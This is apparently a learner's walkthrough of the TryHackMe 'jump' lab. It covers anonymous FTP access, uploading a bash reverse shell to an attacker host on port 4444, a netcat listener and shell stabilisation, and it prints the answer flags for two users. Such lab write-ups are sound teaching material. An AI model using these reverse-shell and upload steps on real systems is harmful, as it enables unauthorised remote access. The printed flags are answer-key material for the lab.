# [jump](https://tryhackme.com/room/jump)

## setup

- create a **jump** folder, `cd` in the folder
- connect to the target machine

```bash
ftp targetIp
```

- `anonymous:anonymous`
- new terminal tab in **jump**
- create an `reverse.sh` file

---

```sh
#!/bin/bash

sh -i >& /dev/tcp/attackerIp/4444 0>&1
```

- `sh -i` -> starts an interactive shell, `-i` -> interactive
- `/dev/tcp/attackerIp/4444` -> opens a network connection to your attack machine on port 4444
- `>&` -> redirects both **stdout (1)** and **stderr (2)** to whatever follows, to the socket
- `0>&1` -> redirect input from the socket, since stdout is already the socket, stdin becomes the socket too, now the shell reads commands from the network

---

- start a listener on the attack machine:

```
nc -lnvp 4444
```

---

- `nc` -> netcat
- `-l` -> listen
- `-v` -> verbose (show connection info)
- `-n` -> don't resolve DNS
- `-p 4444` -> listen on port 4444
- this starts to listen on port 4444

---

- on the ftp server move to the `/incoming` folder
- copy the `reverse.sh`

```bash
put reverse.sh
```

- only works if the ftp was started from the folder where the `reverse.sh` is
- go to the listener
- it should be connected
- list the folder content `ls -la`
- there should be the first flag

## recon user

> What is the flag found in the recon_user’s home directory?

```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

## dev user

- upgrading the shell (shell stabilisation)

---

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- `python3 -c '...'` -> run this Python code inline
- `import pty` -> load Python's pseudo-terminal module
- `pty.spawn("/bin/bash")` -> launch bash attached to a fake terminal (a PTY)

> shell thinks it's a real terminal, gives a proper prompt and tools like sudo

---

- hit `ctrl+z` -> it will background the listener, then

---

```bash
stty raw -echo;fg
```

- `stty raw` -> passes keystrokes straight through (so Ctrl+C, arrows, etc. reach the target instead of your local machine)
- `-echo` -> stops your local terminal from double-printing what you type
- `;` -> command separator
- `fg` -> foregrounds the backgrounded shell, this is a separate command

---

- type `export TERM=xterm`, enter
- hit `ctrl+c`
- arrived back to the reverse shell
- move up in the folder
- list the content `ls -la`
- move into the `dev_user` folder
- list the content `ls -la`
- cat the flag

> What is the flag found in the dev_user’s home directory?

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

## to be continued ...
